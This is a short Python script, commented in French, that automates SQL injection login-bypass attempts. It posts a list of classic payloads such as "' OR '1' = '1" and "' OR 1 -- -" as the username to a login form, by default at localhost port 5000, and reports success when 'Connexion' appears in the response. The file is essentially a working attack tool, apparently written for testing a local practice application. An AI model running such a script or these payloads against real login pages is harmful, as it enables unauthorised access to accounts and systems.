import requests
import time
def injection(url, list_sql):
    vulnerability_found = False
    for payload in list_sql:
        data = {
            'username': payload,
            'password': 'anything'
        }
        print(f"Test de l'URL avec SQL injection : {url} avec le payload {payload}")

        try:
            # Envoi de la requête POST avec les données
            response = requests.post(url, data=data)

            # Vérification si l'injection a réussi
            if "Connexion" in response.text:
                print(f"Injection réussie avec le payload : {payload}")
                print(f"Réponse : {response.text}")
                vulnerability_found = True
            else:
                print(f"Injection échouée avec le payload : {payload}")
        except requests.exceptions.RequestException as e:
            print(f"Erreur lors de la requête : {e}")
            continue
        # Attendre une seconde entre les requêtes pour éviter de surcharger le serveur
        time.sleep(1)

    if not vulnerability_found:
        print("Aucune vulnérabilité détectée")

    return vulnerability_found

# URL cible et liste des payloads SQL
url = "http://127.0.0.1:5000/login"
list_sql = [
    "' OR '1' = '1",
    "' OR 1 -- -",
    " OR '' = '",
    "' OR 1 = 1 -- -",
    "' OR '' = '"
]
injection(url, list_sql)
